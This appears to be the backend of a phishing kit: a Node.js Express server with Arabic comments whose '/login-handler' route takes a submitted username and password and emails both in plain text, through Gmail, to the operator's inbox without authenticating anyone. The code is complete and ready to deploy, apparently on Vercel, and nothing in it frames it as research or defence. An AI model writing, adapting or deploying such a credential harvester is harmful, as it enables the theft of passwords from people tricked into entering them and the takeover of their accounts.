const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

// استخدم middleware
app.use(express.json()); // لتحليل بيانات JSON
app.use(cors()); // للسماح بالوصول من مصادر مختلفة

// إعداد Nodemailer باستخدام متغيرات البيئة
const transporter = nodemailer.createTransport({
    service: 'gmail', // أو أي خدمة بريد أخرى مثل 'outlook' أو 'yahoo'
    auth: {
        user: process.env.EMAIL_USER, // يقرأ من متغير البيئة
        pass: process.env.EMAIL_PASS, // يقرأ من متغير البيئة
    }
});

// مسار (route) للتعامل مع الطلبات العادية على الصفحة الرئيسية
// هذا يحل مشكلة "Cannot GET /"
app.get('/', (req, res) => {
    res.send('الخادم يعمل بشكل صحيح. الرجاء استخدام صفحة تسجيل الدخول.');
});

// مسار (route) لمعالجة طلب تسجيل الدخول
app.post('/login-handler', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان.' });
    }

    // إعداد محتوى رسالة البريد الإلكتروني
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER, // يمكنك تعديله لبريد آخر إذا أردت
        subject: 'تم تسجيل دخول جديد',
        html: `
            <h3>بيانات تسجيل الدخول:</h3>
            <p><b>اسم المستخدم:</b> ${username}</p>
            <p><b>كلمة المرور:</b> ${password}</p>
        `
    };

    // إرسال البريد الإلكتروني
    try {
        await transporter.sendMail(mailOptions);
        console.log('تم إرسال البريد بنجاح.');
        res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح.' });
    } catch (error) {
        console.error('فشل إرسال البريد:', error);
        res.status(500).json({ success: false, message: 'فشل إرسال البريد الإلكتروني.' });
    }
});

// تشغيل الخادم على المنفذ المحدد من Vercel أو المنفذ 3000
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
